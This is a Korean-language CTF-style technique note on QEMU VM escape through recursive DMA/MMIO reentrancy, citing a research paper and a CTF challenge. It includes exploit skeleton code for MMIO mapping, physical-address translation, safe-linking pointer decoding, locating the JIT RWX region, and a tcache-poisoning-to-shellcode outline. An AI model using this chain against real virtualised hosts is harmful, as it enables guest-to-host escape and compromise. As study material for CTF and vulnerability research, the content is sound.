# QEMU VM Escape Techniques

## DMA MMIO Reentrancy (Matryoshka Trap)

### 개요
QEMU 커스텀 디바이스에서 게스트의 DMA 버퍼 주소를 디바이스 MMIO 영역으로 설정하면,
DMA 처리 중 MMIO 핸들러가 재귀적으로 호출되어 내부 상태가 손상됨.

### 탐지 시그널
- QEMU 커스텀 PCI 디바이스 (resource0 MMIO 매핑)
- DMA 전송 기능 (address_space_rw, dma_memory_read/write)
- MMIO 핸들러에서 DMA 버퍼 읽기/쓰기
- 노트/버퍼 할당/해제 기능

### 취약점 원리
```
1. 게스트가 DMA 버퍼 주소를 MMIO 영역 물리 주소로 설정
2. 디바이스가 DMA 읽기 수행 → MMIO 핸들러 재진입
3. 재진입된 핸들러가 현재 처리 중인 객체를 해제
4. 원래 핸들러가 해제된 객체에 접근 → UAF
```

### 익스플로잇 기본 구조

**1. MMIO 매핑**
```c
int fd = open("/sys/devices/pci0000:00/0000:00:XX.0/resource0", O_RDWR | O_SYNC);
mmio_virt = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
// MMIO 물리 주소는 resource 파일에서 읽기
```

**2. DMA 버퍼 할당 (물리 연속)**
```c
void *buf = mmap(0, size, PROT_READ | PROT_WRITE,
                 MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE | MAP_LOCKED, -1, 0);
mlock(buf, size);
// /proc/self/pagemap으로 물리 주소 변환
```

**3. Chained Recursive MMIO**
```c
// RWvec 배열의 buf 주소를 MMIO 물리 주소로 설정
rwv[0] = { .buf = mmio_phys + WRITE_CMD1, ... };  // 재귀 MMIO 트리거
rwv[1] = { .buf = mmio_phys + WRITE_CMD2, ... };  // 추가 명령
// PROCESS_RWVEC 실행 → 각 RWvec이 MMIO 핸들러 재진입
```

**4. Heap leak + TCG RWX**
```c
// glibc 2.32+ safe-linking 디코딩
heap_ptr |= prot_ptr & (0xfffULL << 36);
heap_ptr |= (prot_ptr ^ (heap_ptr >> 12)) & (0xfffULL << 24);
// ...

// QEMU TCG (JIT) RWX 영역: heap 근처 고정 오프셋
uint64_t rwx = (heap_ptr & ~0xffffffULL) + 0xc000000;
```

**5. tcache poisoning → RWX 할당 → shellcode**

### 핵심 주의사항
- DMA 버퍼의 물리 연속성 필요 → 여러 번 mmap 시도
- `/proc/self/pagemap` 읽기에 root 권한 필요 (또는 CAP_SYS_ADMIN)
- QEMU 버전마다 TCG RWX 오프셋 다를 수 있음
- safe-linking 디코딩 시 carry 비트 주의

### 참고
- "Matryoshka Trap: Recursive MMIO Flaws Lead to VM Escape" 논문
- GoN 2022F J. NPU (1 solve)
